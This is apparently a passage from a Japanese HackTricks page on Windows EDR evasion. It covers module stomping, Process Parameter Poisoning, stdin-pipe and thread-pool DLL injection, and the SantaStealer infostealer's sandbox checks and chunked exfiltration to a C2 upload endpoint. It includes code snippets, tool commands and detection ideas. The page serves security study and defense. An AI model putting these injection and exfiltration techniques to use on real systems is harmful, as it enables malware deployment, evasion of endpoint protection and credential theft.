list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

運用上の注意
- `LoadLibrary` /予期しないイメージ読み込みの telemetry を避けるため、リモートプロセスですでに **ロード済み** の DLL を優先する。
- 対象アプリケーションがほとんど実行しない export を優先する。そうしないと、スレッド作成の前後に通常のコードパスが改変されたバイト列に到達する可能性がある。
- 大きな implant では、injector のソース内でバッファ全体を正しく表現できるよう、shellcode の埋め込み形式を文字列リテラルから **byte-array / braced initializer** に変更する必要がある場合が多い。

検出のアイデア
- よくある private RWX/RX allocation ではなく、**image-backed executable pages** (`MEM_IMAGE`、`PAGE_EXECUTE*`) へのリモート書き込み。
- メモリ上の export entry point のバイト列が、ディスク上の backing file と一致しない。
- 最近先頭バイトが変更された正規 DLL export 内から実行を開始するリモートスレッドや context pivot。
- DLL の `.text` ページに対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` のシーケンスと、その後のスレッド作成。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、従来のリモート書き込み経路 (`VirtualAllocEx` + `WriteProcessMemory`) を回避する **process-injection / EDR-evasion** 手法です。すでに実行中のターゲットにバイト列をコピーする代わりに、Windows が選択された `CreateProcessW` の起動パラメーターを子プロセスに**コピー**し、`PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) に格納する仕組みを悪用します。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` によってコピーされる poisonable carriers

有用な carrier は次のとおりです。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` を指定) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実用上の carrier の制約：

- `lpCommandLine` は `CreateProcessW` に対して **書き込み可能なメモリ** を指す必要があり、null terminator を含めて **32,767 Unicode characters** が上限です。
- `lpEnvironment` は、連続する `NAME=VALUE\0` 文字列の末尾に追加の `\0` を置いた Unicode environment block である必要があります。
- `lpReserved` は公式には予約済みのため、`ShellInfo` へのマッピングは安定した文書化済みの仕様ではなく、実装の詳細として扱う必要があります。

これにより、通常のプロセス作成が **payload-transfer primitive** になります。オペレーターは攻撃者が制御する起動データを使って子プロセスを作成し、Windows にプロセス間コピーを実行させます。

### リモート書き込み API を使わないリモート lookup の流れ

子プロセスの作成後、**read-only** の primitive でコピー済みバッファを解決します。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. リモート `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択したポインターを使用する：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最小限の流れ：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. プロセスを通常どおり作成する（suspended にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` で既に返されたメインスレッドハンドルを再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行をリダイレクトする

従来の thread hijacking の手順とは異なり、`SuspendThread` / `ResumeThread` は不要です。返されたメインスレッドハンドルに対して、直接コンテキストを変更できます。

これにより、インジェクションの監視で一般的に対象となる次の API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も回避できます

### Null byte の制限と staged shellcode

3 つの carrier はすべて**文字列または文字列に類似したデータ**であるため、`0x00` を含む raw payload は転送中に切り詰められます。実用的な回避策は、実行時に定数を再構築してから任意の second stage を読み込む、**null-free の first stage**です。

簡単な手法は、XOR ベースで定数を合成することです。

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

これにより、第1ステージは、転送されるパラメーターに null バイトを埋め込まずに、stack strings、API 引数、DLL パス、または第2ステージの shellcode loader を構築できます。

### 第1ステージからのスタックベースの API 呼び出し

第1ステージで `LoadLibraryA` などの API を呼び出す必要がある場合、次の操作を行えます。

- 文字列／バッファーをターゲットのスタックに push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインターを設定する
- 呼び出しの前に `RSP` を **16-byte aligned** に保つ

その後、第2ステージをスタックから `PAGE_READWRITE` のメモリー領域にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してからジャンプできます。これにより、直接 RWX 領域を確保せずに済みます。

### 検出のアイデア

著者が挙げている有効な調査ポイントは次のとおりです。

- `VirtualProtectEx` / `NtProtectVirtualMemory` によって**プロセスパラメーターのページが実行可能**になる動作
- その保護属性の変更に続く `SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` をリモートから読み取る動作
- プロセス作成時における、通常より長い、またはエントロピーの高い `lpCommandLine`、`lpEnvironment`、`STARTUPINFO.lpReserved` の値

### 注記

- P3 は**プロセス間転送の手法**であり、それ単体で完全な実行プリミティブになるわけではありません。コピーしたパラメーターには、実行権限への変更と実行先を切り替える方法が必要です。
- `RtlCreateProcessReflection` / Dirty Vanity も著者らによって検討されましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの疑わしいプリミティブを使用するため、採用されませんでした。

**既存の** Windows プロセスに thread descriptions 経由で payload を送り込み、その後、待機中のスレッドの return address を乗っ取る方法については、[Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md) を参照してください。

## Console STDIN pipe injection

対話型コンソールの子プロセスも、**payload-transfer primitive** として利用できます。injector は子プロセスの標準入力をパイプにリダイレクトし、marker に続けて shellcode を送信します。コンソールプログラムがデータを自身のプライベートメモリーに読み込んだ後、injector はそのバッファーを見つけて実行可能にし、子スレッドの実行先をそこに切り替えます。これにより `VirtualAllocEx` と `WriteProcessMemory` は回避できますが、これは依然としてプロセスインジェクションであり、一般的な EDR bypass ではありません。<sup>[[41]](#references)</sup>

「named-pipe」と説明されていますが、参照実装が呼び出すのは `CreatePipe` であり、これは**匿名パイプ**を作成します。Windows は匿名パイプを内部的に一意な名前付きパイプオブジェクトとして実装しますが、この PoC は `\\.\pipe\<name>` パスを指定せず、`CreateNamedPipe` も呼び出しません。デフォルトのセキュリティ記述子を使って継承可能なハンドルを作成し、読み取りハンドルを `STARTUPINFO.hStdInput` に設定して、`STARTF_USESTDHANDLES` を指定し、ハンドル継承を有効にして新しい子プロセスを起動します。したがって、この PoC は指定されたコンソール実行ファイルを起動するものであり、既存プロセスにパイプを接続するものではありません。<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 参照ワークフロー

実装では、次の手順を使用します。<sup>[[41]](#references)</sup>

1. 子プロセスの `STDIN` と `STDOUT` 用に、匿名パイプのペアを作成します。親プロセス側の2つのハンドルでは継承を無効にし、プロセス作成後に親プロセス内の子プロセス側ハンドルの複製を閉じます。
2. `CREATE_NEW_CONSOLE` を指定し、`netsh.exe` や `nslookup.exe` などの対話型実行ファイルを起動します。子プロセスはリダイレクトされた標準ハンドルを継承します。
3. 親プロセス側の `STDIN` ハンドルを通じ、`WriteFile` で完全なバイナリ `rawData` 配列を送信します。コンソールプログラムはバイト列を消費し、そのコピーを自身のコミット済みプライベート領域のいずれかに残します。
4. `VirtualQueryEx` を使って子プロセスのアドレス空間を走査し、`ReadProcessMemory` で候補となる `MEM_PRIVATE` 領域を読み取り、`rawData` の先頭にある marker を検索します。
5. `VirtualProtectEx` を使い、見つかったバッファーの保護属性を `PAGE_EXECUTE_READWRITE` に変更します。
6. メインスレッドを特定して一時停止し、`NtSetContextThread` で `RIP` を `found_address + 0x19` に設定してから、スレッドを再開します。

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

提供された実装はx64専用です。`CONTEXT.Rip`を変更し、埋め込みpayloadはx64 shellcodeです。`rawData`は25バイトのマーカーで始まるため、実行可能なバイト列は16進オフセット`0x19`から始まります。payloadを置き換える場合は、このレイアウトを維持するか、マーカー、検索ベクトル、配列サイズ、実行オフセットをまとめて更新してください。ソースコメントでは、`0x0A`、`0x0D`、`0x1A`も使用できない文字として挙げられています。このワークフローでは、子プロセスのtokenや権限は変更されません。<sup>[[41]](#references)</sup>

小規模なネイティブヘルパーやpayloadのコンパイルパターンについては、[Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)を参照してください。

## shellcodeを使わないスレッドプールコールバックDLL injection（DLLParty）

DLLPartyは、PoolPartyスタイルのスレッドプールinjectionを応用し、既存のターゲットworkerに注入したコールバックスタブを実行させるのではなく、`LoadLibraryA`を呼び出させます。dispatchの仕組みには、ターゲットのI/O completion portにキューイングされた`TP_DIRECT` completionを使います。これはプロセス権限のbypassではありません。PoCは`OpenProcess(PROCESS_ALL_ACCESS)`を呼び出し、ターゲットメモリの読み書き権限と、worker-factoryおよびcompletion-portハンドルを複製する権限を必要とします。<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64では、workerはスタック上に確保された`TP_CALLBACK_INSTANCE`へのポインターを、最初のコールバック引数として`RCX`に渡します。`LoadLibraryA`はその同じポインターを`LPCSTR`として解釈します。テストされた処理経路では、`TppWorkerThread`は`RSP+0x178`にポインターを作成し、そのオブジェクトへの最初の通常の書き込みは`RSP+0x1d0`で行われます。そのため、この0x58バイトのプレフィックスに収まるnull終端DLLパスは、dispatch前に上書きされることなく、インスタンスの先頭に配置できます。これは特定のビルドで確認されたものであり、文書化されたWindows ABIの保証ではありません。<sup>[[46]](#references)[[47]](#references)</sup>

参考ワークフローは次のとおりです。<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)`でターゲットのハンドルを列挙し、オブジェクトタイプを照会して`TpWorkerFactory`を特定します。worker-factoryハンドルを複製し、`WorkerFactoryBasicInformation`を照会します。`StartParameter`からリモートの`TP_POOL`を取得します。`TotalWorkerCount == 0`のfactoryはスキップします。
2. `TP_POOL.CompletionPort`を読み取り、poolのprivate worker listをたどります。テストされたWindows 10 19045 x64ビルド（`ntdll.dll 10.0.19041.4842`）では、headは`pool+0x60`にあり、各リンクは`worker+0x10`にあります。そのため、`worker+0x38`にあるcallback-instanceスロットは`link+0x28`と一致します。PoCはポインターのアラインメント、リンクの相互参照、poolの所有関係、0以外のスレッドID、ノードの重複、安定したlist headをチェックします。
3. キューイングされたcompletionはどのworkerにも処理される可能性があるため、見つかった**すべての**workerスロットにDLLパスを書き込みます。書き込み可能なターゲットメモリに、`Callback = LoadLibraryA`の`TP_DIRECT`を配置します。PoCは`VirtualAllocEx`の代わりに、workerスタック上の`last_slot-0x500`を使用します。このオフセットは実験的なもので、使用中のスタックデータと衝突しないようにする必要があります。
4. ターゲットのcompletion-portハンドルを複製し、`ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`を呼び出します。リモートの`TP_DIRECT`アドレスがcompletion keyです。既存のworkerが、上書きされたcallback-instanceポインターを使って`LoadLibraryA`を呼び出し、ターゲットがアクセスできるDLLを読み込みます。

PoCはターゲットPID（`DLLParty.exe <target_pid>`）を受け取り、`DLLParty.cpp`にハードコードされたDLLパスを使用します。ビルド前に、ターゲットからアクセス可能なパスを設定し、x64実行ファイルをビルドしてください。また、自プロセスの`LoadLibraryA`アドレスをリモートコールバックとして使うため、そのアドレスがターゲットでも有効であることを前提としています。コードはパスの長さが0x58バイトのプレフィックス内に収まるかを確認せず、worker traversalでスロットが見つかったかを確認する前に最後の要素をインデックス参照します。ターゲットのビルドに合わせて、private offset、スタックレイアウト、書き込み可能な領域を再検証してください。`CreateRemoteThreadEx`、shellcode、`VirtualAllocEx`を使わなくても、プロセス間の書き込みやDLL loadのテレメトリーがなくなるわけではありません。<sup>[[46]](#references)[[47]](#references)</sup>

## fileless evasionとcredential theftに関するSantaStealerの手法

SantaStealer（別名BluelineStealer）は、現代のinfo-stealerがAV bypass、anti-analysis、credential accessを単一のワークフローに組み合わせる例です。<sup>[[24]](#references)</sup>

### キーボードレイアウトによる実行制御とsandbox遅延

- configフラグ（`anti_cis`）は`GetKeyboardLayoutList`でインストール済みのキーボードレイアウトを列挙します。Cyrillicレイアウトが見つかると、サンプルは空の`CIS`マーカーを作成して終了します。これにより、除外対象の地域では実行されず、調査用の痕跡は残ります。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 多層 `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各プロセス名に独自のローリングチェックサムを適用して、デバッガーや sandbox の埋め込み blocklist と照合します。コンピューター名にも同じチェックサム処理を行い、`C:\analysis` などの作業ディレクトリも確認します。
- Variant B はシステムプロパティ（プロセス数の下限、直近の稼働時間）を調べ、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、sleep の前後でタイミングを確認して single-stepping を検知します。いずれかに該当すると、モジュールの起動前に処理を中止します。

### Fileless helper + ChaCha20 による二重の reflective loading

- メインの DLL/EXE には Chromium の認証情報取得 helper が埋め込まれており、ディスクに書き出すか、メモリ内に手動で map します。fileless モードでは、helper の成果物を一切書き込まずに、import と relocation を自ら解決します。
- この helper は、ChaCha20 で二重に暗号化された第 2 段階の DLL を保持します（32 バイトの key 2 つと 12 バイトの nonce）。2 回の復号後、blob を reflective loading し（`LoadLibrary` は使わず）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export を呼び出します。<sup>[[25]](#references)</sup>
- ChromElevator のルーチンは、direct-syscall による reflective process hollowing を使って稼働中の Chromium browser に inject し、AppBound Encryption の key を引き継ぎます。そして、ABE による hardening にもかかわらず、SQLite database から password、cookie、クレジットカード情報を直接復号します。


### モジュール式のメモリ内収集と分割 HTTP exfil

- `create_memory_based_log` は、グローバルな関数ポインター table `memory_generators` を走査し、有効なモジュール（Telegram、Discord、Steam、スクリーンショット、ドキュメント、browser extension など）ごとに thread を 1 つ起動します。各 thread は結果を共有 buffer に書き込み、約 45 秒の join 待機後にファイル数を報告します。
- 完了すると、静的リンクされた `miniz` library を使って、すべてのデータを `%TEMP%\\Log.zip` に zip します。続いて `ThreadPayload1` は 15 秒 sleep し、アーカイブを 10 MB 単位で `http://<C2>:6767/upload` に HTTP POST で送信します。この際、browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装します。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意の `w: <campaign_tag>` が追加され、最後の chunk には `complete: true` が付加されて、C2 に再構成の完了を知らせます。

## References

- [1] [高度な回避手法：精密な Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack：マルウェアに無償の猶予はもう与えない](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer の新たな感染チェーンと ConfuserEx ベースの難読化](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – 自社の zero trust を信頼できますか？Zscaler の posture check を回避する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去の ransomware 活動を調査する](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：Forwarded Export の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Export 一覧（apis_fwd.txt）](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library の検索順序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process のセキュリティとアクセス権](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference（MS-PPSEC）](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light（PPL）の保護を活用した EDR 対策](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique で Windows Defender の保護シェルを破る](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink コマンドのリファレンス](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain の裏側：RAT から Builder、そして Coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer がやって来る：新たな野心的 Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption の復号](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API tracing による Node.js malware の無力化](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [眠れる森の美女：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [眠れる森の美女 II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW を隠す](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team 活動における Chrome Remote Desktop の悪用：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の Remediation Driver を kernel 操作の primitive として武器化する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：LLVM を使った自己マスキング関数の作成](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe 関数](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - リダイレクトされた入力と出力を使用した Child Process の作成](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy：WasmForge で C# ツールを再構築する](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET project のコンパイル](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — shellcode を使わない DLL injection のための thread pool 内部構造の悪用](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset と thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [EMBER2024 を使った red team implant の評価](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – 機械学習ベースの検出を回避する](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader：XAML ベースの .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader の技術分析](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [tprtdll-Injection の概要と export 一覧](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [Trusted-twin self-injection PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [Trusted-twin cross-process injection PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)
{{#include ../banners/hacktricks-training.md}}
